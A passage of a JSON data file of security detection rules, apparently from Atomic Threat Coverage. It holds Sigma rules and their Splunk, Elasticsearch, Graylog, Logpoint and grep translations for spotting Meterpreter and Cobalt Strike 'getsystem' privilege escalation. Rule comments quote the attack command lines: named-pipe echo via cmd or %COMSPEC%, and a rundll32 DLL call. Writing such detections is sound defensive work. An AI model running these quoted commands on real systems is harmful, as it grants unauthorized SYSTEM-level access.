https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/\ntags:\n    - attack.privilege_escalation\n    - attack.t1134\ndetection:\n    selection:\n        - ServiceFileName|contains:\n            - 'cmd'\n            - 'comspec'\n        # meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 > \\\\.\\pipe\\5e120a\n        - ServiceFileName|contains|all:\n            - 'cmd'\n            - '/c'\n            - 'echo'\n            - '\\pipe\\'\n        # cobaltstrike getsystem technique 1: %COMSPEC% /c echo 559891bb017 > \\\\.\\pipe\\5e120a\n        - ServiceFileName|contains|all:\n            - '%COMSPEC%'\n            - '/c'\n            - 'echo'\n            - '\\pipe\\'\n        # meterpreter getsystem technique 2: rundll32.exe C:\\Users\\test\\AppData\\Local\\Temp\\tmexsn.dll,a /p:tmexsn\n        - ServiceFileName|contains|all:\n            - 'rundll32'\n            - '.dll,a'\n            - '/p:'\n    condition: selection\nfields:\n    - ServiceFileName\nfalsepositives:\n    - Highly unlikely\nlevel: critical\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "action: global\ntitle: Meterpreter or Cobalt Strike getsystem service installation\nid: 843544a7-56e0-4dcc-a44f-5cc266dd97d6\ndescription: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation\nauthor: Teymur Kheirkhabarov\ndate: 2019/10/26\nmodified: 2019/11/11\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/\ntags:\n    - attack.privilege_escalation\n    - attack.t1134\ndetection:\n    selection:\n        - ServiceFileName|contains:\n            - 'cmd'\n            - 'comspec'\n        # meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 > \\\\.\\pipe\\5e120a\n        - ServiceFileName|contains|all:\n            - 'cmd'\n            - '/c'\n            - 'echo'\n            - '\\pipe\\'\n        # cobaltstrike getsystem technique 1: %COMSPEC% /c echo 559891bb017 > \\\\.\\pipe\\5e120a\n        - ServiceFileName|contains|all:\n            - '%COMSPEC%'\n            - '/c'\n            - 'echo'\n            - '\\pipe\\'\n        # meterpreter getsystem technique 2: rundll32.exe C:\\Users\\test\\AppData\\Local\\Temp\\tmexsn.dll,a /p:tmexsn\n        - ServiceFileName|contains|all:\n            - 'rundll32'\n            - '.dll,a'\n            - '/p:'\n    condition: selection\nfields:\n    - ServiceFileName\nfalsepositives:\n    - Highly unlikely\nlevel: critical\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ServiceFileName.keyword:(*cmd* OR *comspec*) OR (ServiceFileName.keyword:*cmd* AND ServiceFileName.keyword:*\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\pipe\\\\*) OR (ServiceFileName.keyword:*%COMSPEC%* AND ServiceFileName.keyword:*\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\pipe\\\\*) OR (ServiceFileName.keyword:*rundll32* AND ServiceFileName.keyword:*.dll,a* AND ServiceFileName.keyword:*\\\\/p\\\\:*))\\n(ServiceFileName.keyword:(*cmd* OR *comspec*) OR (ServiceFileName.keyword:*cmd* AND ServiceFileName.keyword:*\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\pipe\\\\*) OR (ServiceFileName.keyword:*%COMSPEC%* AND ServiceFileName.keyword:*\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\pipe\\\\*) OR (ServiceFileName.keyword:*rundll32* AND ServiceFileName.keyword:*.dll,a* AND ServiceFileName.keyword:*\\\\/p\\\\:*))\\n(ServiceFileName.keyword:(*cmd* OR *comspec*) OR (ServiceFileName.keyword:*cmd* AND ServiceFileName.keyword:*\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\pipe\\\\*) OR (ServiceFileName.keyword:*%COMSPEC%* AND ServiceFileName.keyword:*\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\pipe\\\\*) OR (ServiceFileName.keyword:*rundll32* AND ServiceFileName.keyword:*.dll,a* AND ServiceFileName.keyword:*\\\\/p\\\\:*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Meterpreter-or-Cobalt-Strike-getsystem-service-installation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Meterpreter or Cobalt Strike getsystem service installation\",\\n    \"description\": \"Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1134\"\\n    ],\\n    \"query\": \"(ServiceFileName.keyword:(*cmd* OR *comspec*) OR (ServiceFileName.keyword:*cmd* AND ServiceFileName.keyword:*\\\\\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (ServiceFileName.keyword:*%COMSPEC%* AND ServiceFileName.keyword:*\\\\\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (ServiceFileName.keyword:*rundll32* AND ServiceFileName.keyword:*.dll,a* AND ServiceFileName.keyword:*\\\\\\\\/p\\\\\\\\:*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ServiceFileName.keyword:(*cmd* OR *comspec*) OR (ServiceFileName.keyword:*cmd* AND ServiceFileName.keyword:*\\\\\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (ServiceFileName.keyword:*%COMSPEC%* AND ServiceFileName.keyword:*\\\\\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (ServiceFileName.keyword:*rundll32* AND ServiceFileName.keyword:*.dll,a* AND ServiceFileName.keyword:*\\\\\\\\/p\\\\\\\\:*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Meterpreter or Cobalt Strike getsystem service installation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\nServiceFileName = {{_source.ServiceFileName}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Meterpreter-or-Cobalt-Strike-getsystem-service-installation-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Meterpreter or Cobalt Strike getsystem service installation\",\\n    \"description\": \"Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1134\"\\n    ],\\n    \"query\": \"(ServiceFileName.keyword:(*cmd* OR *comspec*) OR (ServiceFileName.keyword:*cmd* AND ServiceFileName.keyword:*\\\\\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (ServiceFileName.keyword:*%COMSPEC%* AND ServiceFileName.keyword:*\\\\\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (ServiceFileName.keyword:*rundll32* AND ServiceFileName.keyword:*.dll,a* AND ServiceFileName.keyword:*\\\\\\\\/p\\\\\\\\:*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ServiceFileName.keyword:(*cmd* OR *comspec*) OR (ServiceFileName.keyword:*cmd* AND ServiceFileName.keyword:*\\\\\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (ServiceFileName.keyword:*%COMSPEC%* AND ServiceFileName.keyword:*\\\\\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (ServiceFileName.keyword:*rundll32* AND ServiceFileName.keyword:*.dll,a* AND ServiceFileName.keyword:*\\\\\\\\/p\\\\\\\\:*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Meterpreter or Cobalt Strike getsystem service installation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\nServiceFileName = {{_source.ServiceFileName}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Meterpreter-or-Cobalt-Strike-getsystem-service-installation-3 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Meterpreter or Cobalt Strike getsystem service installation\",\\n    \"description\": \"Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1134\"\\n    ],\\n    \"query\": \"(ServiceFileName.keyword:(*cmd* OR *comspec*) OR (ServiceFileName.keyword:*cmd* AND ServiceFileName.keyword:*\\\\\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (ServiceFileName.keyword:*%COMSPEC%* AND ServiceFileName.keyword:*\\\\\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (ServiceFileName.keyword:*rundll32* AND ServiceFileName.keyword:*.dll,a* AND ServiceFileName.keyword:*\\\\\\\\/p\\\\\\\\:*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ServiceFileName.keyword:(*cmd* OR *comspec*) OR (ServiceFileName.keyword:*cmd* AND ServiceFileName.keyword:*\\\\\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (ServiceFileName.keyword:*%COMSPEC%* AND ServiceFileName.keyword:*\\\\\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (ServiceFileName.keyword:*rundll32* AND ServiceFileName.keyword:*.dll,a* AND ServiceFileName.keyword:*\\\\\\\\/p\\\\\\\\:*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Meterpreter or Cobalt Strike getsystem service installation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\nServiceFileName = {{_source.ServiceFileName}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ServiceFileName.keyword:(*cmd* *comspec*) OR (ServiceFileName.keyword:*cmd* AND ServiceFileName.keyword:*\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\pipe\\\\*) OR (ServiceFileName.keyword:*%COMSPEC%* AND ServiceFileName.keyword:*\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\pipe\\\\*) OR (ServiceFileName.keyword:*rundll32* AND ServiceFileName.keyword:*.dll,a* AND ServiceFileName.keyword:*\\\\/p\\\\:*))\\n(ServiceFileName.keyword:(*cmd* *comspec*) OR (ServiceFileName.keyword:*cmd* AND ServiceFileName.keyword:*\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\pipe\\\\*) OR (ServiceFileName.keyword:*%COMSPEC%* AND ServiceFileName.keyword:*\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\pipe\\\\*) OR (ServiceFileName.keyword:*rundll32* AND ServiceFileName.keyword:*.dll,a* AND ServiceFileName.keyword:*\\\\/p\\\\:*))\\n(ServiceFileName.keyword:(*cmd* *comspec*) OR (ServiceFileName.keyword:*cmd* AND ServiceFileName.keyword:*\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\pipe\\\\*) OR (ServiceFileName.keyword:*%COMSPEC%* AND ServiceFileName.keyword:*\\\\/c* AND ServiceFileName.keyword:*echo* AND ServiceFileName.keyword:*\\\\\\\\pipe\\\\*) OR (ServiceFileName.keyword:*rundll32* AND ServiceFileName.keyword:*.dll,a* AND ServiceFileName.keyword:*\\\\/p\\\\:*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ServiceFileName=\"*cmd*\" OR ServiceFileName=\"*comspec*\") OR (ServiceFileName=\"*cmd*\" ServiceFileName=\"*/c*\" ServiceFileName=\"*echo*\" ServiceFileName=\"*\\\\\\\\pipe\\\\*\") OR (ServiceFileName=\"*%COMSPEC%*\" ServiceFileName=\"*/c*\" ServiceFileName=\"*echo*\" ServiceFileName=\"*\\\\\\\\pipe\\\\*\") OR (ServiceFileName=\"*rundll32*\" ServiceFileName=\"*.dll,a*\" ServiceFileName=\"*/p:*\")) | table ServiceFileName\\n((ServiceFileName=\"*cmd*\" OR ServiceFileName=\"*comspec*\") OR (ServiceFileName=\"*cmd*\" ServiceFileName=\"*/c*\" ServiceFileName=\"*echo*\" ServiceFileName=\"*\\\\\\\\pipe\\\\*\") OR (ServiceFileName=\"*%COMSPEC%*\" ServiceFileName=\"*/c*\" ServiceFileName=\"*echo*\" ServiceFileName=\"*\\\\\\\\pipe\\\\*\") OR (ServiceFileName=\"*rundll32*\" ServiceFileName=\"*.dll,a*\" ServiceFileName=\"*/p:*\")) | table ServiceFileName\\n((ServiceFileName=\"*cmd*\" OR ServiceFileName=\"*comspec*\") OR (ServiceFileName=\"*cmd*\" ServiceFileName=\"*/c*\" ServiceFileName=\"*echo*\" ServiceFileName=\"*\\\\\\\\pipe\\\\*\") OR (ServiceFileName=\"*%COMSPEC%*\" ServiceFileName=\"*/c*\" ServiceFileName=\"*echo*\" ServiceFileName=\"*\\\\\\\\pipe\\\\*\") OR (ServiceFileName=\"*rundll32*\" ServiceFileName=\"*.dll,a*\" ServiceFileName=\"*/p:*\")) | table ServiceFileName", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (ServiceFileName IN [\"*cmd*\", \"*comspec*\"] OR (ServiceFileName=\"*cmd*\" ServiceFileName=\"*/c*\" ServiceFileName=\"*echo*\" ServiceFileName=\"*\\\\\\\\pipe\\\\*\") OR (ServiceFileName=\"*%COMSPEC%*\" ServiceFileName=\"*/c*\" ServiceFileName=\"*echo*\" ServiceFileName=\"*\\\\\\\\pipe\\\\*\") OR (ServiceFileName=\"*rundll32*\" ServiceFileName=\"*.dll,a*\" ServiceFileName=\"*/p:*\")))\\n(ServiceFileName IN [\"*cmd*\", \"*comspec*\"] OR (ServiceFileName=\"*cmd*\" ServiceFileName=\"*/c*\" ServiceFileName=\"*echo*\" ServiceFileName=\"*\\\\\\\\pipe\\\\*\") OR (ServiceFileName=\"*%COMSPEC%*\" ServiceFileName=\"*/c*\" ServiceFileName=\"*echo*\" ServiceFileName=\"*\\\\\\\\pipe\\\\*\") OR (ServiceFileName=\"*rundll32*\" ServiceFileName=\"*.dll,a*\" ServiceFileName=\"*/p:*\"))\\n(event_source=\"Microsoft-Windows-Security-Auditing\" (ServiceFileName IN [\"*cmd*\", \"*comspec*\"] OR (ServiceFileName=\"*cmd*\" ServiceFileName=\"*/c*\" ServiceFileName=\"*echo*\" ServiceFileName=\"*\\\\\\\\pipe\\\\*\") OR (ServiceFileName=\"*%COMSPEC%*\" ServiceFileName=\"*/c*\" ServiceFileName=\"*echo*\" ServiceFileName=\"*\\\\\\\\pipe\\\\*\") OR (ServiceFileName=\"*rundll32*\" ServiceFileName=\"*.dll,a*\" ServiceFileName=\"*/p:*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*.*cmd.*|.*.*comspec.*)|.*(?:.*(?=.*.*cmd.*)(?=.*.*/c.*)(?=.*.*echo.*)(?=.*.*\\\\pipe\\\\.*))|.*(?:.*(?=.*.*%COMSPEC%.*)(?=.*.*/c.*)(?=.*.*echo.*)(?=.*.*\\\\pipe\\\\.*))|.*(?:.*(?=.*.*rundll32.*)(?=.*.*\\\\.dll,a.*)(?=.*.*/p:.*))))'\\ngrep -P '^(?:.*(?:.*(?:.*.*cmd.*|.*.*comspec.*)|.*(?:.*(?=.*.*cmd.*)(?=.*.*/c.*)(?=.*.*echo.*)(?=.*.*\\\\pipe\\\\.*))|.*(?:.*(?=.*.*%COMSPEC%.*)(?=.*.*/c.*)(?=.*.*echo.*)(?=.*.*\\\\pipe\\\\.*))|.*(?:.*(?=.*.*rundll32.*)(?=.*.*\\\\.dll,a.*)(?=.*.*/p:.*))))'\\ngrep -P '^(?:.*(?:.*(?:.*.*cmd.*|.*.*comspec.*)|.*(?:.*(?=.*.*cmd.*)(?=.*.*/c.*)(?=.*.*echo.*)(?=.*.*\\\\pipe\\\\.*))|.*(?:.*(?=.*.*%COMSPEC%.*)(?=.*.*/c.*)(?=.*.*echo.*)(?=.*.*\\\\pipe\\\\.*))|.*(?:.*(?=.*.*rundll32.*)(?=.*.*\\\\.dll,a.*)(?=.*.*/p:.*))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Meterpreter or Cobalt Strike getsystem service start\nid: 15619216-e993-4721-b590-4c520615a67d\ndescription: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service starting\nauthor: Teymur Kheirkhabarov\ndate: 2019/10/26\nmodified: 2019/11/11\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/\ntags:\n    - attack.privilege_escalation\n    - attack.t1134\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        ParentImage|endswith: '\\services.exe'\n    selection_2:    \n        - CommandLine|contains:\n            - 'cmd'\n            - 'comspec'\n        # meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 > \\\\.\\pipe\\5e120a\n        - CommandLine|contains|all:\n            - 'cmd'\n            - '/c'\n            - 'echo'\n            - '\\pipe\\'\n        # cobaltstrike getsystem technique 1: %COMSPEC% /c echo 559891bb017 > \\\\.\\pipe\\5e120a\n        - CommandLine|contains|all:\n            - '%COMSPEC%'\n            - '/c'\n            - 'echo'\n            - '\\pipe\\'\n        # meterpreter getsystem technique 2: rundll32.exe C:\\Users\\test\\AppData\\Local\\Temp\\tmexsn.dll,a /p:tmexsn\n        - CommandLine|contains|all:\n            - 'rundll32'\n            - '.dll,a'\n            - '/p:'\n    condition: selection_1 and selection_2\nfalsepositives:\n    - Highly unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Meterpreter or Cobalt Strike getsystem service start\nid: 15619216-e993-4721-b590-4c520615a67d\ndescription: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service starting\nauthor: Teymur Kheirkhabarov\ndate: 2019/10/26\nmodified: 2019/11/11\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/\ntags:\n    - attack.privilege_escalation\n    - attack.t1134\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        ParentImage|endswith: '\\services.exe'\n    selection_2:    \n        - CommandLine|contains:\n            - 'cmd'\n            - 'comspec'\n        # meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 > \\\\.\\pipe\\5e120a\n        - CommandLine|contains|all:\n            - 'cmd'\n            - '/c'\n            - 'echo'\n            - '\\pipe\\'\n        # cobaltstrike getsystem technique 1: %COMSPEC% /c echo 559891bb017 > \\\\.\\pipe\\5e120a\n        - CommandLine|contains|all:\n            - '%COMSPEC%'\n            - '/c'\n            - 'echo'\n            - '\\pipe\\'\n        # meterpreter getsystem technique 2: rundll32.exe C:\\Users\\test\\AppData\\Local\\Temp\\tmexsn.dll,a /p:tmexsn\n        - CommandLine|contains|all:\n            - 'rundll32'\n            - '.dll,a'\n            - '/p:'\n    condition: selection_1 and selection_2\nfalsepositives:\n    - Highly unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:*\\\\\\\\services.exe AND (CommandLine.keyword:(*cmd* OR *comspec*) OR (CommandLine.keyword:*cmd* AND CommandLine.keyword:*\\\\/c* AND CommandLine.keyword:*echo* AND CommandLine.keyword:*\\\\\\\\pipe\\\\*) OR (CommandLine.keyword:*%COMSPEC%* AND CommandLine.keyword:*\\\\/c* AND CommandLine.keyword:*echo* AND CommandLine.keyword:*\\\\\\\\pipe\\\\*) OR (CommandLine.keyword:*rundll32* AND CommandLine.keyword:*.dll,a* AND CommandLine.keyword:*\\\\/p\\\\:*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Meterpreter-or-Cobalt-Strike-getsystem-service-start <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Meterpreter or Cobalt Strike getsystem service start\",\\n    \"description\": \"Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service starting\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1134\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\services.exe AND (CommandLine.keyword:(*cmd* OR *comspec*) OR (CommandLine.keyword:*cmd* AND CommandLine.keyword:*\\\\\\\\/c* AND CommandLine.keyword:*echo* AND CommandLine.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (CommandLine.keyword:*%COMSPEC%* AND CommandLine.keyword:*\\\\\\\\/c* AND CommandLine.keyword:*echo* AND CommandLine.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (CommandLine.keyword:*rundll32* AND CommandLine.keyword:*.dll,a* AND CommandLine.keyword:*\\\\\\\\/p\\\\\\\\:*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\services.exe AND (CommandLine.keyword:(*cmd* OR *comspec*) OR (CommandLine.keyword:*cmd* AND CommandLine.keyword:*\\\\\\\\/c* AND CommandLine.keyword:*echo* AND CommandLine.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (CommandLine.keyword:*%COMSPEC%* AND CommandLine.keyword:*\\\\\\\\/c* AND CommandLine.keyword:*echo* AND CommandLine.keyword:*\\\\\\\\\\\\\\\\pipe\\\\\\\\*) OR (CommandLine.keyword:*rundll32* AND CommandLine.keyword:*.dll,a* AND CommandLine.keyword:*\\\\\\\\/p\\\\\\\\:*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Meterpreter or Cobalt Strike getsystem service start\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:*\\\\\\\\services.exe AND (CommandLine.keyword:(*cmd* *comspec*) OR (CommandLine.keyword:*cmd* AND CommandLine.keyword:*\\\\/c* AND CommandLine.keyword:*echo* AND CommandLine.keyword:*\\\\\\\\pipe\\\\*) OR (CommandLine.keyword:*%COMSPEC%* AND CommandLine.keyword:*\\\\/c* AND CommandLine.keyword:*echo* AND CommandLine.keyword:*\\\\\\\\pipe\\\\*) OR (CommandLine.keyword:*rundll32* AND CommandLine.keyword:*.dll,a* AND CommandLine.keyword:*\\\\/p\\\\:*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentImage=\"*\\\\\\\\services.exe\" ((CommandLine=\"*cmd*\" OR CommandLine=\"*comspec*\") OR (CommandLine=\"*cmd*\" CommandLine=\"*/c*\" CommandLine=\"*echo*\" CommandLine=\"*\\\\\\\\pipe\\\\*\") OR (CommandLine=\"*%COMSPEC%*\" CommandLine=\"*/c*\" CommandLine=\"*echo*\" CommandLine=\"*\\\\\\\\pipe\\\\*\") OR (CommandLine=\"*rundll32*\" CommandLine=\"*.dll,a*\" CommandLine=\"*/p:*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\services.exe\" (CommandLine IN [\"*cmd*\", \"*comspec*\"] OR (CommandLine=\"*cmd*\" CommandLine=\"*/c*\" CommandLine=\"*echo*\" CommandLine=\"*\\\\\\\\pipe\\\\*\") OR (CommandLine=\"*%COMSPEC%*\" CommandLine=\"*/c*\" CommandLine=\"*echo*\" CommandLine=\"*\\\\\\\\pipe\\\\*\") OR (CommandLine=\"*rundll32*\" CommandLine=\"*.dll,a*\" CommandLine=\"*/p:*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\services\\\\.exe)(?=.*(?:.*(?:.*(?:.*.*cmd.*|.*.*comspec.*)|.*(?:.*(?=.*.*cmd.*)(?=.*.*/c.*)(?=.*.*echo.*)(?=.*.*\\\\pipe\\\\.*))|.*(?:.*(?=.*.*%COMSPEC%.*)(?=.*.*/c.*)(?=.*.*echo.*)(?=.*.*\\\\pipe\\\\.*))|.*(?:.*(?=.*.*rundll32.*)(?=.*.*\\\\.dll,a.*)(?=.*.*/p:.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Possible Rotten Potato 